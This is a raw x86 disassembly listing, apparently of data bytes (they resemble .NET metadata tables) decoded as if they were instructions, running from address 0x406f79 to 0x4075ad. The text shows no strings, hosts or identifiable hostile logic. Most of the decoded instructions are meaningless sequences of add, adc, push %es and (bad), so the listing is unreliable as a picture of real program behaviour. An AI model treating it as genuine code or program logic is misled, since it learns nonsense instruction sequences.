  406f79:	09 b1 0f 06 00 44    	or     %esi,0x4400060f(%ecx)
  406f7f:	0a fb                	or     %bl,%bh
  406f81:	14 06                	adc    $0x6,%al
  406f83:	00 fb                	add    %bh,%bl
  406f85:	0a af 14 06 00 0b    	or     0xb000614(%edi),%ch
  406f8b:	0c b1                	or     $0xb1,%al
  406f8d:	0f 06                	clts
  406f8f:	00 a8 14 b1 0f 06    	add    %ch,0x60fb114(%eax)
  406f95:	00 14 1a             	add    %dl,(%edx,%ebx,1)
  406f98:	b1 0f                	mov    $0xf,%cl
  406f9a:	06                   	push   %es
  406f9b:	00 15 10 b1 0f 06    	add    %dl,0x60fb110
  406fa1:	00 b1 13 b1 0f 06    	add    %dh,0x60fb113(%ecx)
  406fa7:	00 26                	add    %ah,(%esi)
  406fa9:	09 c2                	or     %eax,%edx
  406fab:	10 06                	adc    %al,(%esi)
  406fad:	00 f8                	add    %bh,%al
  406faf:	0d b1 0f 06 00       	or     $0x60fb1,%eax
  406fb4:	9c                   	pushf
  406fb5:	08 b1 0f 06 00 71    	or     %dh,0x7100060f(%ecx)
  406fbb:	14 b1                	adc    $0xb1,%al
  406fbd:	0f 06                	clts
  406fbf:	00 7e 11             	add    %bh,0x11(%esi)
  406fc2:	c2 10 06             	ret    $0x610
  406fc5:	00 8e 15 c2 10 06    	add    %cl,0x610c215(%esi)
  406fcb:	00 02                	add    %al,(%edx)
  406fcd:	0a c2                	or     %dl,%al
  406fcf:	10 06                	adc    %al,(%esi)
  406fd1:	00 d8                	add    %bl,%al
  406fd3:	14 6c                	adc    $0x6c,%al
  406fd5:	1a 06                	sbb    (%esi),%al
  406fd7:	00 de                	add    %bl,%dh
  406fd9:	0f 6c                	(bad)
  406fdb:	1a 06                	sbb    (%esi),%al
  406fdd:	00 7c 0f 4f          	add    %bh,0x4f(%edi,%ecx,1)
  406fe1:	06                   	push   %es
  406fe2:	06                   	push   %es
  406fe3:	00 6f 0f             	add    %ch,0xf(%edi)
  406fe6:	6c                   	insb   (%dx),%es:(%edi)
  406fe7:	1a 06                	sbb    (%esi),%al
  406fe9:	00 b8 0f 6c 1a 06    	add    %bh,0x61a6c0f(%eax)
  406fef:	00 82 0f 4f 06 06    	add    %al,0x6064f0f(%edx)
  406ff5:	00 04 08             	add    %al,(%eax,%ecx,1)
  406ff8:	6c                   	insb   (%dx),%es:(%edi)
  406ff9:	1a 06                	sbb    (%esi),%al
  406ffb:	00 6c 08 b1          	add    %ch,-0x4f(%eax,%ecx,1)
  406fff:	0f 0b                	ud2
  407001:	00 ef                	add    %ch,%bh
  407003:	10 00                	adc    %al,(%eax)
  407005:	00 0e                	add    %cl,(%esi)
  407007:	00 61 08             	add    %ah,0x8(%ecx)
  40700a:	13 12                	adc    (%edx),%edx
  40700c:	06                   	push   %es
  40700d:	00 f4                	add    %dh,%ah
  40700f:	17                   	pop    %ss
  407010:	b1 0f                	mov    $0xf,%cl
  407012:	06                   	push   %es
  407013:	00 4b 1b             	add    %cl,0x1b(%ebx)
  407016:	ec                   	in     (%dx),%al
  407017:	0e                   	push   %cs
  407018:	06                   	push   %es
  407019:	00 3c 1b             	add    %bh,(%ebx,%ebx,1)
  40701c:	07                   	pop    %es
  40701d:	16                   	push   %ss
  40701e:	06                   	push   %es
  40701f:	00 ef                	add    %ch,%bh
  407021:	0f b1 0f             	cmpxchg %ecx,(%edi)
  407024:	06                   	push   %es
  407025:	00 16                	add    %dl,(%esi)
  407027:	02 b1 0f 06 00 4f    	add    0x4f00060f(%ecx),%dh
  40702d:	16                   	push   %ss
  40702e:	fb                   	sti
  40702f:	14 06                	adc    $0x6,%al
  407031:	00 78 08             	add    %bh,0x8(%eax)
  407034:	b1 0f                	mov    $0xf,%cl
  407036:	0a 00                	or     (%eax),%al
  407038:	af                   	scas   %es:(%edi),%eax
  407039:	1a 84 16 0a 00 d5 09 	sbb    0x9d5000a(%esi,%edx,1),%al
  407040:	84 16                	test   %dl,(%esi)
  407042:	0a 00                	or     (%eax),%al
  407044:	c0 09 84             	rorb   $0x84,(%ecx)
  407047:	16                   	push   %ss
  407048:	0a 00                	or     (%eax),%al
  40704a:	32 18                	xor    (%eax),%bl
  40704c:	4d                   	dec    %ebp
  40704d:	17                   	pop    %ss
  40704e:	0a 00                	or     (%eax),%al
  407050:	27                   	daa
  407051:	16                   	push   %ss
  407052:	84 16                	test   %dl,(%esi)
  407054:	37                   	aaa
  407055:	00 66 14             	add    %ah,0x14(%esi)
  407058:	00 00                	add    %al,(%eax)
  40705a:	06                   	push   %es
  40705b:	00 de                	add    %bl,%dh
  40705d:	1a ea                	sbb    %dl,%ch
  40705f:	15 06 00 8c 17       	adc    $0x178c0006,%eax
  407064:	b1 0f                	mov    $0xf,%cl
  407066:	06                   	push   %es
  407067:	00 a9 0e b1 0f 06    	add    %ch,0x60fb10e(%ecx)
  40706d:	00 dc                	add    %bl,%ah
  40706f:	03 b1 0f 06 00 62    	add    0x6200060f(%ecx),%esi
  407075:	13 b1 0f 06 00 31    	adc    0x3100060f(%ecx),%esi
  40707b:	14 b1                	adc    $0xb1,%al
  40707d:	0f 06                	clts
  40707f:	00 06                	add    %al,(%esi)
  407081:	10 b1 0f 06 00 c5    	adc    %dh,-0x3afff9f1(%ecx)
  407087:	01 b1 0f 0a 00 9b    	add    %esi,-0x64fff5f1(%ecx)
  40708d:	15 84 16 06 00       	adc    $0x61684,%eax
  407092:	35 11 b1 0f 0a       	xor    $0xa0fb111,%eax
  407097:	00 b8 17 4d 17 06    	add    %bh,0x6174d17(%eax)
  40709d:	00 68 07             	add    %ch,0x7(%eax)
  4070a0:	94                   	xchg   %eax,%esp
  4070a1:	0d 06 00 c5 13       	or     $0x13c50006,%eax
  4070a6:	b1 0f                	mov    $0xf,%cl
  4070a8:	06                   	push   %es
  4070a9:	00 18                	add    %bl,(%eax)
  4070ab:	1b 4f 06             	sbb    0x6(%edi),%ecx
  4070ae:	06                   	push   %es
  4070af:	00 d2                	add    %dl,%dl
  4070b1:	11 4f 06             	adc    %ecx,0x6(%edi)
  4070b4:	06                   	push   %es
  4070b5:	00 49 0e             	add    %cl,0xe(%ecx)
  4070b8:	4f                   	dec    %edi
  4070b9:	06                   	push   %es
  4070ba:	06                   	push   %es
  4070bb:	00 97 08 4f 06 06    	add    %dl,0x6064f08(%edi)
  4070c1:	00 ea                	add    %ch,%dl
  4070c3:	19 94 0d 0a 00 00 18 	sbb    %edx,0x1800000a(%ebp,%ecx,1)
  4070ca:	06                   	push   %es
  4070cb:	0f 12 00             	movlps (%eax),%xmm0
  4070ce:	70 13                	jo     0x4070e3
  4070d0:	e2 17                	loop   0x4070e9
  4070d2:	12 00                	adc    (%eax),%al
  4070d4:	d4 10                	aam    $0x10
  4070d6:	e2 17                	loop   0x4070ef
  4070d8:	97                   	xchg   %eax,%edi
  4070d9:	01 48 14             	add    %ecx,0x14(%eax)
  4070dc:	00 00                	add    %al,(%eax)
  4070de:	12 00                	adc    (%eax),%al
  4070e0:	db 16                	fistl  (%esi)
  4070e2:	e2 17                	loop   0x4070fb
  4070e4:	12 00                	adc    (%eax),%al
  4070e6:	0c 17                	or     $0x17,%al
  4070e8:	e2 17                	loop   0x407101
  4070ea:	06                   	push   %es
  4070eb:	00 17                	add    %dl,(%edi)
  4070ed:	02 b1 0f 06 00 a8    	add    -0x57fff9f1(%ecx),%dh
  4070f3:	0f b1 0f             	cmpxchg %ecx,(%edi)
  4070f6:	06                   	push   %es
  4070f7:	00 98 11 4f 06 06    	add    %bl,0x6064f11(%eax)
  4070fd:	00 8f 03 b1 0f 06    	add    %cl,0x60fb103(%edi)
  407103:	00 55 12             	add    %dl,0x12(%ebp)
  407106:	6c                   	insb   (%dx),%es:(%edi)
  407107:	1a 06                	sbb    (%esi),%al
  407109:	00 cb                	add    %cl,%bl
  40710b:	0f 6c                	(bad)
  40710d:	1a 06                	sbb    (%esi),%al
  40710f:	00 e4                	add    %ah,%ah
  407111:	0e                   	push   %cs
  407112:	dc 14 06             	fcoml  (%esi,%eax,1)
  407115:	00 5c 1a 06          	add    %bl,0x6(%edx,%ebx,1)
  407119:	02 0a                	add    (%edx),%cl
  40711b:	00 b0 11 af 14 06    	add    %dh,0x614af11(%eax)
  407121:	00 36                	add    %dh,(%esi)
  407123:	12 4f 06             	adc    0x6(%edi),%cl
  407126:	06                   	push   %es
  407127:	00 43 12             	add    %al,0x12(%ebx)
  40712a:	4f                   	dec    %edi
  40712b:	06                   	push   %es
  40712c:	06                   	push   %es
  40712d:	00 25 12 b1 0f 06    	add    %ah,0x60fb112
  407133:	00 3c 16             	add    %bh,(%esi,%edx,1)
  407136:	b1 0f                	mov    $0xf,%cl
  407138:	06                   	push   %es
  407139:	00 45 0c             	add    %al,0xc(%ebp)
  40713c:	06                   	push   %es
  40713d:	02 06                	add    (%esi),%al
  40713f:	00 95 19 06 02 06    	add    %dl,0x6020619(%ebp)
  407145:	00 ac 10 b1 0f 06 00 	add    %ch,0x60fb1(%eax,%edx,1)
  40714c:	8e 18                	mov    (%eax),%ds
  40714e:	b1 0f                	mov    $0xf,%cl
  407150:	0a 00                	or     (%eax),%al
  407152:	b4 08                	mov    $0x8,%ah
  407154:	af                   	scas   %es:(%edi),%eax
  407155:	14 00                	adc    $0x0,%al
  407157:	00 00                	add    %al,(%eax)
  407159:	00 a7 05 00 00 00    	add    %ah,0x5(%edi)
  40715f:	00 01                	add    %al,(%ecx)
  407161:	00 01                	add    %al,(%ecx)
  407163:	00 00                	add    %al,(%eax)
  407165:	00 10                	add    %dl,(%eax)
  407167:	00 93 10 d2 17 05    	add    %dl,0x517d210(%ebx)
  40716d:	00 01                	add    %al,(%ecx)
  40716f:	00 01                	add    %al,(%ecx)
  407171:	00 00                	add    %al,(%eax)
  407173:	00 10                	add    %dl,(%eax)
  407175:	00 98 13 d2 17 05    	add    %bl,0x517d213(%eax)
  40717b:	00 03                	add    %al,(%ebx)
  40717d:	00 09                	add    %cl,(%ecx)
  40717f:	00 03                	add    %al,(%ebx)
  407181:	01 10                	add    %edx,(%eax)
  407183:	00 21                	add    %ah,(%ecx)
  407185:	03 00                	add    (%eax),%eax
  407187:	00 19                	add    %bl,(%ecx)
  407189:	00 05 00 0c 00 00    	add    %al,0xc00
  40718f:	00 10                	add    %dl,(%eax)
  407191:	00 58 11             	add    %bl,0x11(%eax)
  407194:	d2 17                	rclb   %cl,(%edi)
  407196:	05 00 13 00 0e       	add    $0xe001300,%eax
  40719b:	00 00                	add    %al,(%eax)
  40719d:	00 10                	add    %dl,(%eax)
  40719f:	00 dc                	add    %bl,%ah
  4071a1:	13 d2                	adc    %edx,%edx
  4071a3:	17                   	pop    %ss
  4071a4:	05 00 13 00 11       	add    $0x11001300,%eax
  4071a9:	00 03                	add    %al,(%ebx)
  4071ab:	01 10                	add    %edx,(%eax)
  4071ad:	00 0d 03 00 00 19    	add    %cl,0x19000003
  4071b3:	00 15 00 1b 00 03    	add    %dl,0x3001b00
  4071b9:	01 10                	add    %edx,(%eax)
  4071bb:	00 27                	add    %ah,(%edi)
  4071bd:	00 00                	add    %al,(%eax)
  4071bf:	00 19                	add    %bl,(%ecx)
  4071c1:	00 1b                	add    %bl,(%ebx)
  4071c3:	00 1d 00 03 01 10    	add    %bl,0x10010300
  4071c9:	00 27                	add    %ah,(%edi)
  4071cb:	04 00                	add    $0x0,%al
  4071cd:	00 19                	add    %bl,(%ecx)
  4071cf:	00 21                	add    %ah,(%ecx)
  4071d1:	00 1f                	add    %bl,(%edi)
  4071d3:	00 03                	add    %al,(%ebx)
  4071d5:	01 10                	add    %edx,(%eax)
  4071d7:	00 43 01             	add    %al,0x1(%ebx)
  4071da:	00 00                	add    %al,(%eax)
  4071dc:	19 00                	sbb    %eax,(%eax)
  4071de:	25 00 21 00 03       	and    $0x3002100,%eax
  4071e3:	01 10                	add    %edx,(%eax)
  4071e5:	00 8d 04 00 00 19    	add    %cl,0x19000004(%ebp)
  4071eb:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4071ee:	23 00                	and    (%eax),%eax
  4071f0:	03 01                	add    (%ecx),%eax
  4071f2:	10 00                	adc    %al,(%eax)
  4071f4:	db 04 00             	fildl  (%eax,%eax,1)
  4071f7:	00 19                	add    %bl,(%ecx)
  4071f9:	00 31                	add    %dh,(%ecx)
  4071fb:	00 25 00 03 01 10    	add    %ah,0x10010300
  407201:	00 94 05 00 00 19 00 	add    %dl,0x190000(%ebp,%eax,1)
  407208:	3a 00                	cmp    (%eax),%al
  40720a:	27                   	daa
  40720b:	00 03                	add    %al,(%ebx)
  40720d:	01 10                	add    %edx,(%eax)
  40720f:	00 58 05             	add    %bl,0x5(%eax)
  407212:	00 00                	add    %al,(%eax)
  407214:	19 00                	sbb    %eax,(%eax)
  407216:	40                   	inc    %eax
  407217:	00 29                	add    %ch,(%ecx)
  407219:	00 01                	add    %al,(%ecx)
  40721b:	00 10                	add    %dl,(%eax)
  40721d:	00 2c 08             	add    %ch,(%eax,%ecx,1)
  407220:	d2 17                	rclb   %cl,(%edi)
  407222:	05 00 45 00 2b       	add    $0x2b004500,%eax
  407227:	00 03                	add    %al,(%ebx)
  407229:	01 10                	add    %edx,(%eax)
  40722b:	00 ee                	add    %ch,%dh
  40722d:	04 00                	add    $0x0,%al
  40722f:	00 19                	add    %bl,(%ecx)
  407231:	00 4c 00 37          	add    %cl,0x37(%eax,%eax,1)
  407235:	00 03                	add    %al,(%ebx)
  407237:	01 10                	add    %edx,(%eax)
  407239:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  40723c:	00 00                	add    %al,(%eax)
  40723e:	19 00                	sbb    %eax,(%eax)
  407240:	54                   	push   %esp
  407241:	00 39                	add    %bh,(%ecx)
  407243:	00 03                	add    %al,(%ebx)
  407245:	01 10                	add    %edx,(%eax)
  407247:	00 15 00 00 00 19    	add    %dl,0x19000000
  40724d:	00 5f 00             	add    %bl,0x0(%edi)
  407250:	3b 00                	cmp    (%eax),%eax
  407252:	03 01                	add    (%ecx),%eax
  407254:	10 00                	adc    %al,(%eax)
  407256:	b5 02                	mov    $0x2,%ch
  407258:	00 00                	add    %al,(%eax)
  40725a:	19 00                	sbb    %eax,(%eax)
  40725c:	63 00                	arpl   %eax,(%eax)
  40725e:	3d 00 03 01 10       	cmp    $0x10010300,%eax
  407263:	00 3d 03 00 00 19    	add    %bh,0x19000003
  407269:	00 67 00             	add    %ah,0x0(%edi)
  40726c:	3f                   	aas
  40726d:	00 00                	add    %al,(%eax)
  40726f:	00 10                	add    %dl,(%eax)
  407271:	00 4e 12             	add    %cl,0x12(%esi)
  407274:	d2 17                	rclb   %cl,(%edi)
  407276:	05 00 6c 00 41       	add    $0x41006c00,%eax
  40727b:	00 01                	add    %al,(%ecx)
  40727d:	00 10                	add    %dl,(%eax)
  40727f:	00 a3 13 d2 17 05    	add    %ah,0x517d213(%ebx)
  407285:	00 6f 00             	add    %ch,0x0(%edi)
  407288:	42                   	inc    %edx
  407289:	00 03                	add    %al,(%ebx)
  40728b:	21 10                	and    %edx,(%eax)
  40728d:	00 75 06             	add    %dh,0x6(%ebp)
  407290:	00 00                	add    %al,(%eax)
  407292:	05 00 72 00 4e       	add    $0x4e007200,%eax
  407297:	00 03                	add    %al,(%ebx)
  407299:	01 10                	add    %edx,(%eax)
  40729b:	00 01                	add    %al,(%ecx)
  40729d:	00 00                	add    %al,(%eax)
  40729f:	00 19                	add    %bl,(%ecx)
  4072a1:	00 74 00 51          	add    %dh,0x51(%eax,%eax,1)
  4072a5:	00 03                	add    %al,(%ebx)
  4072a7:	01 10                	add    %edx,(%eax)
  4072a9:	00 3c 04             	add    %bh,(%esp,%eax,1)
  4072ac:	00 00                	add    %al,(%eax)
  4072ae:	19 00                	sbb    %eax,(%eax)
  4072b0:	78 00                	js     0x4072b2
  4072b2:	53                   	push   %ebx
  4072b3:	00 03                	add    %al,(%ebx)
  4072b5:	01 10                	add    %edx,(%eax)
  4072b7:	00 bc 03 00 00 19 00 	add    %bh,0x190000(%ebx,%eax,1)
  4072be:	83 00 55             	addl   $0x55,(%eax)
  4072c1:	00 03                	add    %al,(%ebx)
  4072c3:	01 10                	add    %edx,(%eax)
  4072c5:	00 84 05 00 00 19 00 	add    %al,0x190000(%ebp,%eax,1)
  4072cc:	8b 00                	mov    (%eax),%eax
  4072ce:	57                   	push   %edi
  4072cf:	00 00                	add    %al,(%eax)
  4072d1:	00 10                	add    %dl,(%eax)
  4072d3:	00 89 0f d2 17 05    	add    %cl,0x517d20f(%ecx)
  4072d9:	00 90 00 59 00 03    	add    %dl,0x3005900(%eax)
  4072df:	01 10                	add    %edx,(%eax)
  4072e1:	00 37                	add    %dh,(%edi)
  4072e3:	01 00                	add    %eax,(%eax)
  4072e5:	00 19                	add    %bl,(%ecx)
  4072e7:	00 9b 00 5f 00 01    	add    %bl,0x1005f00(%ebx)
  4072ed:	00 10                	add    %dl,(%eax)
  4072ef:	00 0f                	add    %cl,(%edi)
  4072f1:	14 d2                	adc    $0xd2,%al
  4072f3:	17                   	pop    %ss
  4072f4:	5d                   	pop    %ebp
  4072f5:	00 a4 00 61 00 01 00 	add    %ah,0x10061(%eax,%eax,1)
  4072fc:	10 00                	adc    %al,(%eax)
  4072fe:	01 16                	add    %edx,(%esi)
  407300:	d2 17                	rclb   %cl,(%edi)
  407302:	05 00 a5 00 67       	add    $0x6700a500,%eax
  407307:	00 0d 01 10 00 41    	add    %cl,0x41001001
  40730d:	06                   	push   %es
  40730e:	00 00                	add    %al,(%eax)
  407310:	19 00                	sbb    %eax,(%eax)
  407312:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407313:	00 7d 00             	add    %bh,0x0(%ebp)
  407316:	03 21                	add    (%ecx),%esp
  407318:	10 00                	adc    %al,(%eax)
  40731a:	75 06                	jne    0x407322
  40731c:	00 00                	add    %al,(%eax)
  40731e:	05 00 a7 00 7d       	add    $0x7d00a700,%eax
  407323:	00 03                	add    %al,(%ebx)
  407325:	01 10                	add    %edx,(%eax)
  407327:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40732b:	00 05 00 aa 00 81    	add    %al,0x8100aa00
  407331:	00 03                	add    %al,(%ebx)
  407333:	01 10                	add    %edx,(%eax)
  407335:	00 a2 00 00 00 05    	add    %ah,0x5000000(%edx)
  40733b:	00 ab 00 83 00 03    	add    %ch,0x3008300(%ebx)
  407341:	01 10                	add    %edx,(%eax)
  407343:	00 67 05             	add    %ah,0x5(%edi)
  407346:	00 00                	add    %al,(%eax)
  407348:	19 00                	sbb    %eax,(%eax)
  40734a:	ad                   	lods   %ds:(%esi),%eax
  40734b:	00 85 00 03 01 10    	add    %al,0x10010300(%ebp)
  407351:	00 07                	add    %al,(%edi)
  407353:	05 00 00 19 00       	add    $0x190000,%eax
  407358:	b4 00                	mov    $0x0,%ah
  40735a:	87 00                	xchg   %eax,(%eax)
  40735c:	03 01                	add    (%ecx),%eax
  40735e:	10 00                	adc    %al,(%eax)
  407360:	ee                   	out    %al,(%dx)
  407361:	03 00                	add    (%eax),%eax
  407363:	00 19                	add    %bl,(%ecx)
  407365:	00 b9 00 89 00 03    	add    %bh,0x3008900(%ecx)
  40736b:	01 10                	add    %edx,(%eax)
  40736d:	00 34 05 00 00 19 00 	add    %dh,0x190000(,%eax,1)
  407374:	c2 00 8b             	ret    $0x8b00
  407377:	00 03                	add    %al,(%ebx)
  407379:	01 10                	add    %edx,(%eax)
  40737b:	00 38                	add    %bh,(%eax)
  40737d:	00 00                	add    %al,(%eax)
  40737f:	00 19                	add    %bl,(%ecx)
  407381:	00 c5                	add    %al,%ch
  407383:	00 8d 00 03 01 10    	add    %cl,0x10010300(%ebp)
  407389:	00 65 04             	add    %ah,0x4(%ebp)
  40738c:	00 00                	add    %al,(%eax)
  40738e:	19 00                	sbb    %eax,(%eax)
  407390:	c8 00 8f 00          	enter  $0x8f00,$0x0
  407394:	03 01                	add    (%ecx),%eax
  407396:	10 00                	adc    %al,(%eax)
  407398:	a0 04 00 00 19       	mov    0x19000004,%al
  40739d:	00 cc                	add    %cl,%ah
  40739f:	00 91 00 00 01 00    	add    %dl,0x10000(%ecx)
  4073a5:	00 b7 05 00 00 05    	add    %dh,0x5000005(%edi)
  4073ab:	00 cf                	add    %cl,%bh
  4073ad:	00 93 00 15 01 00    	add    %dl,0x11500(%ebx)
  4073b3:	00 b1 04 00 00 19    	add    %dh,0x19000004(%ecx)
  4073b9:	00 d1                	add    %dl,%cl
  4073bb:	00 93 00 15 01 00    	add    %dl,0x11500(%ebx)
  4073c1:	00 e9                	add    %ch,%cl
  4073c3:	01 00                	add    %eax,(%eax)
  4073c5:	00 19                	add    %bl,(%ecx)
  4073c7:	00 d1                	add    %dl,%cl
  4073c9:	00 93 00 51 80 59    	add    %dl,0x59805100(%ebx)
  4073cf:	01 0a                	add    %ecx,(%edx)
  4073d1:	00 51 80             	add    %dl,-0x80(%ecx)
  4073d4:	26 06                	es push %es
  4073d6:	0a 00                	or     (%eax),%al
  4073d8:	06                   	push   %es
  4073d9:	00 33                	add    %dh,(%ebx)
  4073db:	15 56 00 06 00       	adc    $0x60056,%eax
  4073e0:	5b                   	pop    %ebx
  4073e1:	0e                   	push   %cs
  4073e2:	5f                   	pop    %edi
  4073e3:	00 06                	add    %al,(%esi)
  4073e5:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  4073e8:	71 00                	jno    0x4073ea
  4073ea:	06                   	push   %es
  4073eb:	00 aa 12 74 00 06    	add    %ch,0x6007412(%edx)
  4073f1:	00 3e                	add    %bh,(%esi)
  4073f3:	14 78                	adc    $0x78,%al
  4073f5:	00 06                	add    %al,(%esi)
  4073f7:	00 e0                	add    %ah,%al
  4073f9:	15 7c 00 01 00       	adc    $0x1007c,%eax
  4073fe:	3a 02                	cmp    (%edx),%al
  407400:	80 00 01             	addb   $0x1,(%eax)
  407403:	00 f2                	add    %dh,%dl
  407405:	02 80 00 01 00 95    	add    -0x6affff00(%eax),%al
  40740b:	03 80 00 01 00 e3    	add    -0x1cffff00(%eax),%eax
  407411:	03 84 00 01 00 5a 04 	add    0x45a0001(%eax,%eax,1),%eax
  407418:	71 00                	jno    0x40741a
  40741a:	01 00                	add    %eax,(%eax)
  40741c:	cd 04                	int    $0x4
  40741e:	5f                   	pop    %edi
  40741f:	00 01                	add    %al,(%ecx)
  407421:	00 72 01             	add    %dh,0x1(%edx)
  407424:	87 00                	xchg   %eax,(%eax)
  407426:	01 00                	add    %eax,(%eax)
  407428:	8c 02                	mov    %es,(%edx)
  40742a:	8f 00                	pop    (%eax)
  40742c:	01 00                	add    %eax,(%eax)
  40742e:	36 03 96 00 01 00 2c 	add    %ss:0x2c000100(%esi),%edx
  407435:	05 9a 00 01 00       	add    $0x1009a,%eax
  40743a:	10 10                	adc    %dl,(%eax)
  40743c:	78 00                	js     0x40743e
  40743e:	01 00                	add    %eax,(%eax)
  407440:	e5 13                	in     $0x13,%eax
  407442:	7c 00                	jl     0x407444
  407444:	06                   	push   %es
  407445:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  407448:	71 00                	jno    0x40744a
  40744a:	06                   	push   %es
  40744b:	00 aa 12 74 00 06    	add    %ch,0x6007412(%edx)
  407451:	00 67 06             	add    %ah,0x6(%edi)
  407454:	80 00 06             	addb   $0x6,(%eax)
  407457:	00 e0                	add    %ah,%al
  407459:	15 d0 00 01 00       	adc    $0x100d0,%eax
  40745e:	72 01                	jb     0x407461
  407460:	d4 00                	aam    $0x0
  407462:	01 00                	add    %eax,(%eax)
  407464:	8c 02                	mov    %es,(%edx)
  407466:	96                   	xchg   %eax,%esi
  407467:	00 06                	add    %al,(%esi)
  407469:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  40746c:	71 00                	jno    0x40746e
  40746e:	06                   	push   %es
  40746f:	00 aa 12 74 00 06    	add    %ch,0x6007412(%edx)
  407475:	00 67 06             	add    %ah,0x6(%edi)
  407478:	80 00 06             	addb   $0x6,(%eax)
  40747b:	00 3e                	add    %bh,(%esi)
  40747d:	14 78                	adc    $0x78,%al
  40747f:	00 06                	add    %al,(%esi)
  407481:	00 e0                	add    %ah,%al
  407483:	15 d0 00 01 00       	adc    $0x100d0,%eax
  407488:	72 01                	jb     0x40748b
  40748a:	8f 00                	pop    (%eax)
  40748c:	06                   	push   %es
  40748d:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  407490:	71 00                	jno    0x407492
  407492:	06                   	push   %es
  407493:	00 aa 12 74 00 06    	add    %ch,0x6007412(%edx)
  407499:	00 16                	add    %dl,(%esi)
  40749b:	01 78 00             	add    %edi,0x0(%eax)
  40749e:	01 00                	add    %eax,(%eax)
  4074a0:	72 01                	jb     0x4074a3
  4074a2:	8f 00                	pop    (%eax)
  4074a4:	06                   	push   %es
  4074a5:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  4074a8:	71 00                	jno    0x4074aa
  4074aa:	06                   	push   %es
  4074ab:	00 aa 12 74 00 06    	add    %ch,0x6007412(%edx)
  4074b1:	00 31                	add    %dh,(%ecx)
  4074b3:	08 78 00             	or     %bh,0x0(%eax)
  4074b6:	01 00                	add    %eax,(%eax)
  4074b8:	47                   	inc    %edi
  4074b9:	02 5f 00             	add    0x0(%edi),%bl
  4074bc:	01 00                	add    %eax,(%eax)
  4074be:	72 01                	jb     0x4074c1
  4074c0:	dc 00                	faddl  (%eax)
  4074c2:	01 00                	add    %eax,(%eax)
  4074c4:	8c 02                	mov    %es,(%edx)
  4074c6:	e3 00                	jecxz  0x4074c8
  4074c8:	01 00                	add    %eax,(%eax)
  4074ca:	36 03 8f 00 06 00 2c 	add    %ss:0x2c000600(%edi),%ecx
  4074d1:	0a 71 00             	or     0x0(%ecx),%dh
  4074d4:	06                   	push   %es
  4074d5:	00 aa 12 74 00 06    	add    %ch,0x6007412(%edx)
  4074db:	00 e0                	add    %ah,%al
  4074dd:	15 d0 00 01 00       	adc    $0x100d0,%eax
  4074e2:	72 01                	jb     0x4074e5
  4074e4:	87 00                	xchg   %eax,(%eax)
  4074e6:	01 00                	add    %eax,(%eax)
  4074e8:	8c 02                	mov    %es,(%edx)
  4074ea:	96                   	xchg   %eax,%esi
  4074eb:	00 06                	add    %al,(%esi)
  4074ed:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  4074f0:	71 00                	jno    0x4074f2
  4074f2:	06                   	push   %es
  4074f3:	00 aa 12 74 00 06    	add    %ch,0x6007412(%edx)
  4074f9:	00 3e                	add    %bh,(%esi)
  4074fb:	14 78                	adc    $0x78,%al
  4074fd:	00 06                	add    %al,(%esi)
  4074ff:	00 e0                	add    %ah,%al
  407501:	15 d0 00 01 00       	adc    $0x100d0,%eax
  407506:	78 02                	js     0x40750a
  407508:	80 00 01             	addb   $0x1,(%eax)
  40750b:	00 df                	add    %bl,%bh
  40750d:	02 80 00 01 00 72    	add    0x72000100(%eax),%al
  407513:	01 96 00 01 00 8c    	add    %edx,-0x73ffff00(%esi)
  407519:	02 87 00 01 00 36    	add    0x36000100(%edi),%al
  40751f:	03 8f 00 06 00 2c    	add    0x2c000600(%edi),%ecx
  407525:	0a 71 00             	or     0x0(%ecx),%dh
  407528:	06                   	push   %es
  407529:	00 aa 12 74 00 06    	add    %ch,0x6007412(%edx)
  40752f:	00 3e                	add    %bh,(%esi)
  407531:	14 78                	adc    $0x78,%al
  407533:	00 06                	add    %al,(%esi)
  407535:	00 e0                	add    %ah,%al
  407537:	15 d0 00 01 00       	adc    $0x100d0,%eax
  40753c:	72 01                	jb     0x40753f
  40753e:	87 00                	xchg   %eax,(%eax)
  407540:	01 00                	add    %eax,(%eax)
  407542:	8c 02                	mov    %es,(%edx)
  407544:	96                   	xchg   %eax,%esi
  407545:	00 06                	add    %al,(%esi)
  407547:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  40754a:	71 00                	jno    0x40754c
  40754c:	06                   	push   %es
  40754d:	00 aa 12 74 00 06    	add    %ch,0x6007412(%edx)
  407553:	00 3e                	add    %bh,(%esi)
  407555:	14 78                	adc    $0x78,%al
  407557:	00 06                	add    %al,(%esi)
  407559:	00 67 06             	add    %ah,0x6(%edi)
  40755c:	80 00 01             	addb   $0x1,(%eax)
  40755f:	00 72 01             	add    %dh,0x1(%edx)
  407562:	8f 00                	pop    (%eax)
  407564:	01 00                	add    %eax,(%eax)
  407566:	2c 17                	sub    $0x17,%al
  407568:	ea 00 06 00 2a 15 f2 	ljmp   $0xf215,$0x2a000600
  40756f:	00 06                	add    %al,(%esi)
  407571:	00 d6                	add    %dl,%dh
  407573:	0e                   	push   %cs
  407574:	fa                   	cli
  407575:	00 06                	add    %al,(%esi)
  407577:	00 0a                	add    %cl,(%edx)
  407579:	18 78 00             	sbb    %bh,0x0(%eax)
  40757c:	06                   	push   %es
  40757d:	00 19                	add    %bl,(%ecx)
  40757f:	06                   	push   %es
  407580:	71 00                	jno    0x407582
  407582:	06                   	push   %es
  407583:	00 53 07             	add    %dl,0x7(%ebx)
  407586:	71 00                	jno    0x407588
  407588:	06                   	push   %es
  407589:	00 b7 09 71 00 06    	add    %dh,0x6007109(%edi)
  40758f:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  407592:	71 00                	jno    0x407594
  407594:	06                   	push   %es
  407595:	00 aa 12 57 01 06    	add    %ch,0x6015712(%edx)
  40759b:	00 e0                	add    %ah,%al
  40759d:	15 78 00 06 00       	adc    $0x60078,%eax
  4075a2:	e0 09                	loopne 0x4075ad
  4075a4:	71 00                	jno    0x4075a6
  4075a6:	06                   	push   %es
  4075a7:	00 bb 07 71 00 01    	add    %bh,0x1007107(%ebx)
  4075ad:	00 60 02             	add    %ah,0x2(%eax)
